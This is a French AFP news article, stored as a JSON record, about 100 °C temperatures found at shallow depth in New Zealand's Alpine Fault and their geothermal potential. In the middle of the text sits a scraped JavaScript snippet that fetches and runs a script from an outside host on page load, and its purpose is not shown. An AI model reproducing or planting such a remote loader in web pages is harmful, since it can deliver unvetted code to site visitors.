{"title": "Surprise : une chaleur tres elevee dans une faille sismique neozelandaise", "newspaper": "Futura Sciences", "author": ["Paris - AFP"], "date_publi": "2017-05-18", "content": "En Nouvelle-Zelande, les geologues sont tombes sur une grosse surprise en forant le sol de l'ile sud, au niveau de la celebre faille alpine. Les temperatures, tres elevees, y atteignent 100 degC a moins de 700 m de profondeur, ce qui n'arrive que pres d'une activite volcanique. Or, il n'y en a pas. Les caracteristiques de l'endroit peuvent expliquer cette anomalie, qui est aussi une aubaine. Cette trouvaille est vue comme une source d'energie geothermique, un cadeau de la nature qui ne se refuse pas. Ce qu'il faut retenir C'est inhabituel, des temperatures tres elevees ont ete relevees dans une faille sismique en Nouvelle-Zelande. Ces resultats sont  << vraiment surprenants et importants pour la comprehension du fonctionnement des failles geologiques >> . Cette decouverte est une aubaine et pourrait etre exploitee en geothermie. Des chercheurs ont releve des temperatures et des pressions  << extremement elevees >>  sur la  faille  dite alpine en  Nouvelle-Zelande , selon une etude publiee dans la revue  Nature .  << Les temperatures sont aussi hautes que celles trouvees pres des  volcans  actifs alors qu'il n'y en a pas a proximite >> , explique a l'AFP Rupert Sutherland de l'universite Victoria de Wellington. Les forages ayant conduit a cette decouverte ont ete realises a Westland en Nouvelle-Zelande sur cette importante faille marquant la frontiere entre les  plaques tectoniques  pacifique et australienne. Traversant la quasi-totalite de l'ile du sud de la Nouvelle-Zelande et longue de plus de 450 km, la  faille alpine  est connue pour provoquer de violents tremblements de  terre  de magnitude 8 tous les 300 ans. Le dernier datant de 1717, les chercheurs s'attendent a un nouveau  seisme  dans les prochaines decennies. La faille alpine traverse l'ile sud de la Nouvelle-Zelande et marque la frontiere entre deux plaques de croute continentale, la pacifique et l'australienne, qui glissent plus ou moins l'une contre l'autre. (c) Universite d'Otago                       Cette source de chaleur inattendue pourrait etre exploitee en geothermie Rupert Sutherland et ses collegues qui ont realise des mesures de temperature a raison d'une par metre de profondeur, ont decouvert qu'a 630 m, la temperature atteignait 100 degC. Or, de telles valeurs ne sont normalement trouvees qu'a des profondeurs superieures a trois kilometres. Selon le chercheur, aucun forage n'avait ete effectue sur cette faille ni sur aucune autre et ces resultats sont  << vraiment surprenants et importants pour la comprehension du fonctionnement des  failles geologiques  >> .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Dans un article publie par  PhysOrg , Dave Craw, de l'universite d'Otago, rappelle que des forages semblables ont ete effectues dans la celebre  faille de San Andreas , en Californie, mais n'ont jamais montre de telles temperatures. Selon l'etude, ces conditions extremes resultent, d'une part, d'un  mouvement  rapide de la faille faisant remonter la roche et la  chaleur  des profondeurs et, d'autre part, de l'ecoulement des eaux souterraines a travers les roches fracturees. << Cette  activite geothermique  peut sembler alarmante, mais c'est une merveilleuse decouverte scientifique qui pourrait etre commercialement tres significative pour la Nouvelle-Zelande >> , explique le chercheur dans un communique de l'universite qui evoque une possible exploitation de cette ressource d'energie propre ou des retombees pour le secteur touristique. << Le puits de forage continue de fournir des donnees interessantes >> , explique John Townend, un dirigeant du projet  Deep Drilling Fault .  << Ces resultats renforcent la necessite pour la communaute scientifique internationale de mieux comprendre les conditions qui predominent autour des failles geologiques generatrices de seismes >> . La geothermie, une formidable revolution energetique                       L'energie geothermique fait partie des plus anciennes domptees par l'Homme et c'est aussi l'une des plus efficaces. Elle est utilisee a grande echelle en Islande, ou la majeure partie de l'electricite consommee provient de son exploitation. National Geographic Channel nous en parle dans la serie Inventer le futur, dont voici un extrait. Le prochain episode sera diffuse ce soir, vendredi 19 fevrier 2016, a 21 h 30.                                       ", "theme": "planete"}